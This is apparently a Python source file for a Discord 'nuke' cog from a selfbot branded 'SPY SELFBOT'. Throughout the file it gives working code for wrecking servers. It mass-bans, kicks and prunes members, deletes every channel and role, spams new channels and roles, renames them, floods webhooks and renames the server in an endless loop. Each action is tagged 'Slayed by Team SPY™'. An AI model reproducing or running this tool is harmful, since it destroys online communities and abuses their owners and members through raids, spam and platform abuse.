from discord.ext import commands, tasks
import discord
import aiohttp, httpx
from tasksio import TaskPool
import main
import random,os, asyncio

async def channelfuckeryfunc(message):
	async with aiohttp.ClientSession(headers=main.headers) as ses:
		for idk in range(69):
			async with ses.patch(f"https://discord.com/api/v10/guilds/{message.guild.id}",json={"features":["COMMUNITY"],"rules_channel_id":"1","public_updates_channel_id":"1"}) as req:
				continue 
		

async def delrolefunc(message,guild):
	
	guildobj = main.client.get_guild(int(guild))
	for role in guildobj.roles:
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.delete(f"https://discord.com/api/v10/guilds/{guildobj.id}/roles/{role.id}") as req:
				if req.status in [200,201,204]:
					print(f"[+] Deleted role {role.id}")
				elif req.status == 429:
					try:
						await role.delete()
						print(f"[+] Deleted role {role.id}")
					except:
						print(f"[-] Failed to delete role {role.id}")
						continue
				else:
					print(f"[-] Failed to delete role {role.id}")
async def delchannelfunc(message,guild):
	
	guildobj = main.client.get_guild(int(guild))
	for channel in guildobj.channels:
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.delete(f"https://discord.com/api/v10/channels/{channel.id}") as req:
				if req.status in [201,200,204]:
					print(f"[+] Deleted channel {channel.id}")
				elif req.status == 429:
					try:
						await channel.delete()
						print(f"[+] Deleted channel {channel.id}")
					except:
						print(f"[-] Failed to delete channel {channel.id}")
						continue
				else:
					print(f"[-] Failed to delete channel {channel.id}")

async def botmassbanfunc(message, prefix, cooldown, guild):
	
	guildobj = main.client.get_guild(guild)
	for member in guildobj.members:
		await message.channel.send(f"{prefix}ban {member.mention} SPY SELFBOT V6")
		await asyncio.sleep(int(cooldown))
			
async def masskickfunc(message,guild):
	
	guildobj = main.client.get_guild(int(guild))
	for member in guildobj.members:
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.delete(f"https://discord.com/api/v10/guilds/{guildobj.id}/members/{member.id}",json={"reason":"Slayed by Team SPY™"}) as req:
				if req.status in [200,201,204]:
					print(f"[+] Kicked {member.id}")
				elif req.status == 429:
					try:
						await member.kick(reason=f"Slayed by Team SPY™")
						print(f"[+] Kicked {member.id}")
					except:
						print(f"[-] Failed to kick {member.id}")
						continue
				else:
					print(f"[-] Failed to kick {member.id}")
async def channelspamfunc(message,guild,amount:int):
	
	guildobj = main.client.get_guild(int(guild))
	for idk in range(amount):
		name = random.choice(main.SpyEncrypt4)
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.post(f"https://discord.com/api/v10/guilds/{guildobj.id}/channels",json={"name":name}) as req:
				if req.status in [200,201,204]:
					print(f"[+] Created channel")
				elif req.status == 429:
					try:
						await guildobj.create_text_channel(name=name)
						print(f"[+] Created channel")
					except:
						print(f"[-] Failed to create channel")
						continue
				else:
					print(f"[-] Failed to create channel")
async def rolerenamefunc(message,guild):
	
	guildobj = main.client.get_guild(int(guild))
	for role in guildobj.roles:
		name = random.choice(main.SpyEncrypt5)
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.patch(f"https://discord.com/api/v10/guilds/{guildobj.id}/roles/{role.id}",json={"name":name}) as req:
				if req.status in [200,201,204]:
					print(f"[+] Renamed role")
				elif req.status == 429:
					try:
						await role.edit(name=name)
						print(f"[+] Renamed role")
					except:
						print(f"[-] Failed to rename role")
						continue
				else:
					print(f"[-] Failed to rename role")			
async def channelrenamefunc(message,guild):
	
	guildobj = main.client.get_guild(int(guild))
	for channel in guildobj.channels:
		name = random.choice(main.SpyEncrypt4)
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.patch(f"https://discord.com/api/v10/channels/{channel.id}",json={"name":name}) as req:
				if req.status in [200,201,204]:
					print(f"[+] Renamed channel")
				elif req.status == 429:
					try:
						await channel.edit(name=name)
						print(f"[+] Renamed channel")
					except:
						print(f"[-] Failed to rename channel")
						continue
				else:
					print(f"[-] Failed to rename channel")			
async def massbanfunc(message,guild):
	
	guildobj = main.client.get_guild(int(guild))
	for member in guildobj.members:
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.put(f"https://discord.com/api/v10/guilds/{guildobj.id}/bans/{member.id}",json={"reason":"Slayed by Team SPY™"}) as req:
				if req.status in [200,201,204]:
					print(f"[+] Banned {member.id}")
				elif req.status == 429:
					try:
						await member.ban(reason=f"Slayed by Team SPY™")
						print(f"[+] Banned {member.id}")
					except:
						print(f"[-] Failed to ban {member.id}")
						continue
				else:
					print(f"[-] Failed to ban {member.id}")
async def rolespamfunc(message,guild, amount:int):
	
	guildobj = main.client.get_guild(int(guild))
	for idk in range(amount):
		name = random.choice(main.SpyEncrypt5)
		async with aiohttp.ClientSession(headers=main.headers) as ses:
			async with ses.post(f"https://discord.com/api/v10/guilds/{guildobj.id}/roles",json={"name":name}) as req:
				if req.status in [200,201,204]:
					print(f"[+] Created role")
				elif req.status == 429:
					try:
						await guildobj.create_role(name=name)
						print(f"[+] Created role")
					except:
						print(f"[-] Failed to create role")
						continue
				else:
					print(f"[-] Failed to create role")
class NukeCog(commands.Cog):
	def __init__(self, client):
		self.client = client

			
	@commands.Cog.listener('on_message')
	async def nukecommands(self, message):
		if message.author.id in main.SpyEncrypt2:
			async for messages in message.channel.history(limit=5):				
				if messages.id == message.id:
					if messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}botmassban"):
						prefix = messages.content.split()[1]
						cooldown = messages.content.split()[2]
						try:
							guild = messages.content.split()[3]
						except:
							guild = messages.guild.id
						await botmassbanfunc(message=messages,prefix=prefix,guild=guild,cooldown=cooldown)

					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}massban"):
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(massbanfunc(message=messages,guild=guild))	
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}masskick"):
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(masskickfunc(message=messages,guild=guild))
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}spamroles") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}spamrole") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}rolespam"):
						try:
							amount = int(messages.content.split()[2])
						except:
							amount = 250
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(rolespamfunc(message=messages,guild=guild,amount=amount))
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}spamchannels") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}spamchannel") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}channelspam"):
						try:
							amount = int(messages.content.split()[2])
						except:
							amount = 250
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(channelspamfunc(message=messages,guild=guild,amount=amount))
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}deletechannels") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}delchannels") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}massdeletechannels"):
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(delchannelfunc(message=messages,guild=guild))

					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}delroles") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}deleteroles") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}massdeleteroles"):
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(delrolefunc(message=messages,guild=guild))
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}communityspam") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}comspam") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}channelfuckery"):
						async with TaskPool(1_000) as pool:							 
							await pool.put(channelfuckeryfunc(message=messages))
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}rr") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}renameroles") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}massrenameroles"):
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(rolerenamefunc(message=messages,guild=guild))	
					if messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}rc") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}renamechannels") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}massrenamechannels"):
						try:
							guild = messages.content.split()[1]
						except:
							guild = messages.guild.id
						async with TaskPool(1_000) as pool:							 
							await pool.put(channelrenamefunc(message=messages,guild=guild))				
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}prunemembers") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}prune"):
						try:
							rm = int(message.content.split()[1])
						except:
							rm = 20
						try:
							days = message.content.split()[2]
						except:
							days = 1
						await messages.reply(f"SPY SELFBOT | Initiating a prune request.")
						roles = []
						for role in messages.guild.roles:
							if len(role.members) <= rm:
								continue
							roles.append(role)
						await messages.guild.prune_members(days=int(days),reason="Slayed by Team SPY™",roles=roles)
						await messages.reply(f"SPY SELFBOT | Successfully pruned.")
						
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}prunecheck") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}checkprune"):
						try:
							rm = int(message.content.split()[1])
						except:
							rm = 20
						try:
							days = message.content.split()[2]
						except:
							days = 1
						roles = []
						for role in message.guild.roles:
							if len(role.members) <= rm:
								continue
							roles.append(role)
						result = await messages.guild.estimate_pruned_members(days=int(days),roles=roles)
						await messages.reply(f"SPY SELFBOT | {result} members will get kicked on pruning this server with roles that have more than {rm} members and {days} day(s) of inactivity.")
					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}spamhook") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}spamwebhook") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}webhookspam"):
						webhook = messages.content.split()[1]
						amount = int(messages.content.split()[2])
						rawmessage = messages.content.split()[3:]
						message = ' '.join(rawmessage)
						
						for idk in range(amount):	
							req = httpx.post(webhook,json={"content":message})	

					elif messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}massrenameserver") or messages.content.lower().split()[0] == (f"{main.SpyEncrypt1}serverrenamespam"):
						while 1:
							name = random.choice(main.SpyEncrypt6)
							await messages.guild.edit(name=name)
							await asyncio.sleep(5)

def setup(client):
	client.add_cog(NukeCog(client))
